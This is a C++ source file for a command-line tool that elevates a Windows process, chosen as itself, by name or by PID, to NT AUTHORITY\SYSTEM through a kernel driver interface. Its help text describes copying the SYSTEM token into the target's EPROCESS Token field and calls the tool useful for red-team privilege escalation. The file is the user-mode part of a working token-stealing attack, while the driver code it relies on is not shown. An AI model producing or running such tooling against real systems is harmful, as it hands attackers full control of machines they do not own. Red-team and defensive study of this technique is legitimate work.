#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <string>
#include "../Memory/DriverInterface/driver_interface.hpp"

static std::wstring to_wide( const char* s )
{
	std::wstring ws;
	while( *s ) ws += static_cast< wchar_t >( *s++ );
	return ws;
}

void print_help( const char* prog )
{
	printf( "%s - Elevate a process to NT AUTHORITY\\SYSTEM via token stealing.\n", prog );
	printf( "\n" );
	printf( "Description:\n" );
	printf( "  Copies the SYSTEM token from PsInitialSystemProcess into the target\n" );
	printf( "  process's EPROCESS Token field, granting it NT AUTHORITY\\SYSTEM\n" );
	printf( "  privileges. Useful for privilege escalation during red team ops.\n" );
	printf( "\n" );
	printf( "Usage:\n" );
	printf( "  %s --self              Elevate the current process\n", prog );
	printf( "  %s <process_name>      Elevate by process name\n", prog );
	printf( "  %s --pid <pid>         Elevate by process ID\n", prog );
	printf( "  %s --help              Show this help\n", prog );
	printf( "\n" );
	printf( "Arguments:\n" );
	printf( "  --self           Elevate this example process itself\n" );
	printf( "  process_name     Name of the process to elevate (e.g. cmd.exe)\n" );
	printf( "  --pid <pid>      Process ID to elevate (decimal)\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "  %s --self\n", prog );
	printf( "  %s cmd.exe\n", prog );
	printf( "  %s --pid 1337\n", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 )
	{
		print_help( argv[0] );
		return argc > 1 && ( strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 ) ? 0 : 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		printf( "[!] Could not connect to the driver!\n" );
		return 1;
	}

	DWORD target_pid = 0;

	if( strcmp( argv[1], "--self" ) == 0 )
	{
		target_pid = GetCurrentProcessId();
		printf( "[+] Elevating self (PID: %u)\n", target_pid );
	}
	else if( strcmp( argv[1], "--pid" ) == 0 )
	{
		if( argc < 3 )
		{
			printf( "[!] --pid requires a process ID argument.\n" );
			return 1;
		}

		target_pid = static_cast< DWORD >( strtoul( argv[2], nullptr, 10 ) );
	}
	else
	{
		const auto name = to_wide( argv[1] );

		if( !driver->attach( name ) )
		{
			printf( "[!] Could not find process '%s'!\n", argv[1] );
			return 1;
		}

		target_pid = driver->get_pid();
		printf( "[+] Found %s (PID: %u)\n", argv[1], target_pid );
	}

	if( driver->elevate_token( target_pid ) )
		printf( "[+] PID %u elevated to NT AUTHORITY\\SYSTEM!\n", target_pid );
	else
	{
		printf( "[!] Failed to elevate PID %u.\n", target_pid );
		return 1;
	}

	return 0;
}
